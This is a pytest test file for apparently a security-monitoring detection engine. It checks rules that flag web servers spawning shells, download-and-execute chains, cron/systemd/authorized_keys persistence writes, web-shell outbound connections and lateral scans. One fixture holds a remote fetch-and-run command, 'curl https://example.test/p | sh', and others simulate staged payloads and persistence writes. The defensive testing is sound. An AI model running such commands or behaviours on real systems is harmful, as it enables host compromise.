"""P5 process/file/network sequence behavior rule tests."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

import pytest

from aisoc.detection_engine.rules.host_behavior import (
    DownloadExecuteRule,
    LateralScanRule,
    PersistenceChangeRule,
    WebProcessShellRule,
    WebShellOutboundRule,
)
from aisoc.domain import SecurityEvent
from aisoc.domain.detection import AttackState
from aisoc.domain.security_event import SourceKind
from aisoc.normalize import get_normalizer

from ..normalize.test_falco_normalizer import falco_raw
from ._helpers import rule_context

BOOT = "0fdec470-09f9-4dd3-a63f-3b8cdfb11028"
OTHER_BOOT = "fdb4183f-bf54-42b0-8279-bae53bdf93e1"


def test_web_process_shell_from_falco_is_suspected_success() -> None:
    normalized = get_normalizer(SourceKind.FALCO).normalize(  # type: ignore[union-attr]
        falco_raw(
            {
                "evt.type": "execve",
                "proc.exepath": "/bin/bash",
                "proc.cmdline": "bash -c 'curl https://example.test/p | sh'",
                "proc.pid": 4242,
                "proc.ppid": 4100,
                "proc.pname": "nginx",
                "proc.pexepath": "/usr/sbin/nginx",
                "user.name": "www-data",
                "user.uid": 33,
            }
        )
    )
    assert normalized.event is not None

    detections = WebProcessShellRule().evaluate([normalized.event], rule_context())

    assert len(detections) == 1
    assert detections[0].category == "host.web_process.shell"
    assert detections[0].attack_state == AttackState.SUSPECTED_SUCCESS
    assert detections[0].attack_state != AttackState.CONFIRMED_COMPROMISE
    assert detections[0].evidence_event_ids == [normalized.event.event_id]
    assert "confirmed_compromise" in (detections[0].next_steps or "")


def test_non_web_parent_spawning_shell_does_not_match() -> None:
    event = _process_event(parent_path="/usr/lib/systemd/systemd", child_path="/bin/bash")

    assert WebProcessShellRule().evaluate([event], rule_context()) == []


def test_web_parent_spawning_normal_worker_does_not_match() -> None:
    event = _process_event(parent_path="/usr/sbin/nginx", child_path="/usr/sbin/nginx")

    assert WebProcessShellRule().evaluate([event], rule_context()) == []


def test_failed_web_shell_exec_does_not_become_suspected_success() -> None:
    event = _host_event(
        0,
        "process.exec",
        process_path="/bin/sh",
        parent_path="/usr/sbin/nginx",
        pid=99,
        outcome="failure",
    )

    assert WebProcessShellRule().evaluate([event], rule_context()) == []


def test_download_write_chmod_execute_chain_survives_out_of_order_and_duplicate() -> None:
    events = [
        _host_event(1, "process.exec", process_path="/usr/bin/curl", pid=500, offset=0),
        _host_event(
            2,
            "file.openat",
            process_path="/usr/bin/curl",
            file_path="/tmp/.stage/payload",
            pid=500,
            offset=1,
            flags="O_WRONLY|O_CREAT|O_TRUNC",
        ),
        _host_event(
            3,
            "file.chmod",
            process_path="/usr/bin/chmod",
            file_path="/tmp/.stage/payload",
            pid=501,
            offset=2,
        ),
        _host_event(4, "process.exec", process_path="/tmp/.stage/payload", pid=502, offset=3),
    ]

    detections = DownloadExecuteRule().evaluate(
        [events[3], events[1], events[0], events[2], events[1]], rule_context()
    )

    assert len(detections) == 1
    assert detections[0].attack_state == AttackState.SUSPECTED_SUCCESS
    assert detections[0].evidence_event_ids == [event.event_id for event in events]
    assert detections[0].aggregate_metrics["boot_id"] == BOOT


def test_download_chain_requires_write_chmod_and_same_boot() -> None:
    download = _host_event(10, "process.exec", process_path="/usr/bin/wget", pid=600, offset=0)
    write = _host_event(
        11,
        "file.open",
        process_path="/usr/bin/wget",
        file_path="/tmp/payload",
        pid=600,
        offset=1,
        flags="O_WRONLY|O_CREAT",
    )
    execute = _host_event(
        12,
        "process.exec",
        process_path="/tmp/payload",
        pid=601,
        offset=3,
        boot_id=OTHER_BOOT,
    )

    assert DownloadExecuteRule().evaluate([download, write, execute], rule_context()) == []


def test_pid_reuse_resets_downloader_generation_before_file_write() -> None:
    events = [
        _host_event(20, "process.exec", process_path="/usr/bin/curl", pid=700, offset=0),
        _host_event(21, "process.exec", process_path="/usr/bin/backup", pid=700, offset=1),
        _host_event(
            22,
            "file.openat",
            process_path="/usr/bin/backup",
            file_path="/tmp/archive",
            pid=700,
            offset=2,
            flags="O_WRONLY|O_CREAT",
        ),
        _host_event(
            23,
            "file.chmod",
            process_path="/usr/bin/chmod",
            file_path="/tmp/archive",
            pid=701,
            offset=3,
        ),
        _host_event(24, "process.exec", process_path="/tmp/archive", pid=702, offset=4),
    ]

    assert DownloadExecuteRule().evaluate(events, rule_context()) == []


@pytest.mark.parametrize(
    ("path", "mechanism"),
    [
        ("/etc/cron.d/update-check", "cron"),
        ("/etc/systemd/system/update-agent.service", "systemd"),
        ("/home/app/.ssh/authorized_keys", "authorized_keys"),
    ],
)
def test_suspicious_persistence_writes_are_suspected(path: str, mechanism: str) -> None:
    event = _host_event(
        30,
        "file.openat",
        process_path="/bin/bash",
        file_path=path,
        pid=800,
        flags="O_WRONLY|O_CREAT|O_TRUNC",
    )

    detections = PersistenceChangeRule().evaluate([event], rule_context())

    assert len(detections) == 1
    assert detections[0].attack_state == AttackState.SUSPECTED_SUCCESS
    assert detections[0].attack_state != AttackState.CONFIRMED_COMPROMISE
    assert detections[0].aggregate_metrics["mechanism"] == mechanism


def test_package_manager_persistence_change_and_failed_write_are_normal_counterexamples() -> None:
    package_write = _host_event(
        40,
        "file.openat",
        process_path="/usr/bin/dpkg",
        file_path="/etc/systemd/system/vendor.service",
        pid=900,
        flags="O_WRONLY|O_CREAT",
    )
    failed_shell = _host_event(
        41,
        "file.openat",
        process_path="/bin/sh",
        file_path="/etc/cron.d/blocked",
        pid=901,
        flags="O_WRONLY|O_CREAT",
        outcome="failure",
    )

    assert PersistenceChangeRule().evaluate([package_write, failed_shell], rule_context()) == []


def test_long_persistence_path_produces_bounded_persistable_fields() -> None:
    path = f"/home/{'nested/' * 60}.ssh/authorized_keys"
    event = _host_event(
        45,
        "file.openat",
        process_path="/bin/sh",
        file_path=path,
        pid=950,
        flags="O_WRONLY|O_CREAT",
    )

    detection = PersistenceChangeRule().evaluate([event], rule_context())[0]

    assert len(detection.entity_key) <= 256
    assert detection.summary is not None
    assert len(detection.summary) <= 512


def test_web_shell_outbound_requires_same_boot_pid_generation() -> None:
    shell = _host_event(
        50,
        "process.exec",
        process_path="/bin/sh",
        parent_path="/usr/sbin/nginx",
        pid=1000,
        ppid=999,
        offset=0,
    )
    outbound = _host_event(
        51,
        "network.connect",
        process_path="/bin/sh",
        pid=1000,
        dst_ip="8.8.8.8",
        dst_port=443,
        offset=1,
    )

    detections = WebShellOutboundRule().evaluate([outbound, shell], rule_context())

    assert len(detections) == 1
    assert detections[0].attack_state == AttackState.SUSPECTED_SUCCESS
    assert detections[0].evidence_event_ids == [shell.event_id, outbound.event_id]


def test_web_shell_outbound_pid_reuse_and_private_destination_do_not_match() -> None:
    shell = _host_event(
        60,
        "process.exec",
        process_path="/bin/bash",
        parent_path="/usr/sbin/apache2",
        pid=1100,
        offset=0,
    )
    reused = _host_event(61, "process.exec", process_path="/usr/bin/backup", pid=1100, offset=1)
    private_connect = _host_event(
        62,
        "network.connect",
        process_path="/usr/bin/backup",
        pid=1100,
        dst_ip="10.0.0.5",
        dst_port=443,
        offset=2,
    )

    assert WebShellOutboundRule().evaluate([shell, reused, private_connect], rule_context()) == []


def test_lateral_scan_groups_private_destinations_by_process_generation() -> None:
    process = _host_event(70, "process.exec", process_path="/usr/bin/nmap", pid=1200)
    connects = [
        _host_event(
            71 + index,
            "network.connect",
            process_path="/usr/bin/nmap",
            pid=1200,
            dst_ip=f"10.0.0.{10 + index}",
            dst_port=445,
            offset=index + 1,
        )
        for index in range(3)
    ]

    detections = LateralScanRule().evaluate(
        [*reversed(connects), process, connects[0]],
        rule_context(detection_lateral_scan_unique_hosts=3),
    )

    assert len(detections) == 1
    assert detections[0].attack_state == AttackState.ATTACK_ATTEMPT
    assert detections[0].aggregate_metrics["unique_private_hosts"] == 3


def test_lateral_scan_does_not_cross_boot_or_process_generation() -> None:
    first = _host_event(80, "process.exec", process_path="/usr/bin/nmap", pid=1300)
    connects = [
        _host_event(
            81 + index,
            "network.connect",
            process_path="/usr/bin/nmap",
            pid=1300,
            dst_ip=f"10.1.0.{10 + index}",
            dst_port=22,
            offset=index + 1,
            boot_id=BOOT if index < 2 else OTHER_BOOT,
        )
        for index in range(3)
    ]

    assert (
        LateralScanRule().evaluate(
            [first, *connects], rule_context(detection_lateral_scan_unique_hosts=3)
        )
        == []
    )


def _process_event(*, parent_path: str, child_path: str) -> SecurityEvent:
    return SecurityEvent.model_validate(
        {
            "event_id": "evt_hostbehavior01",
            "schema_version": "0.1.0",
            "event_type": "process.exec",
            "event_time": "2026-08-08T08:00:00Z",
            "ingest_time": "2026-08-08T08:00:01Z",
            "source": {"kind": "falco", "collector": "falco-json"},
            "tenant": {"id": "ten_01JTESTTENANT"},
            "host": {"id": "host_01JTESTHOST", "os": "linux"},
            "boot_id": BOOT,
            "actor": {"pid": 1234, "ppid": 1},
            "process": {"path": child_path, "command_line": child_path},
            "extensions": {"process.parent_path": parent_path},
            "raw_ref": "evidence://ten/raw/hostbehavior",
        }
    )


def _host_event(
    seq: int,
    event_type: str,
    *,
    process_path: str,
    pid: int,
    ppid: int = 1,
    file_path: str | None = None,
    parent_path: str | None = None,
    dst_ip: str | None = None,
    dst_port: int | None = None,
    flags: str | None = None,
    outcome: str = "success",
    offset: int = 0,
    boot_id: str = BOOT,
) -> SecurityEvent:
    start = datetime(2026, 8, 8, 8, 0, 0, tzinfo=UTC)
    event_time = start + timedelta(seconds=offset)
    payload: dict[str, object] = {
        "event_id": f"evt_hostchain{seq:04d}",
        "schema_version": "0.1.0",
        "event_type": event_type,
        "event_time": event_time.isoformat(),
        "ingest_time": event_time.isoformat(),
        "boot_id": boot_id,
        "source": {"kind": "falco", "collector": "falco-json"},
        "tenant": {"id": "ten_01JTESTTENANT"},
        "host": {"id": "host_01JTESTHOST", "os": "linux"},
        "actor": {"pid": pid, "ppid": ppid},
        "process": {"path": process_path, "command_line": process_path},
        "outcome": outcome,
        "extensions": {},
        "raw_ref": f"evidence://ten/raw/hostchain/{seq}",
    }
    if file_path is not None:
        payload["file"] = {"path": file_path}
    if dst_ip is not None:
        payload["network"] = {
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "transport": "tcp",
        }
    extensions: dict[str, object] = {}
    if parent_path is not None:
        extensions["process.parent_path"] = parent_path
    if flags is not None:
        extensions["file.flags"] = flags
    payload["extensions"] = extensions
    return SecurityEvent.model_validate(payload)
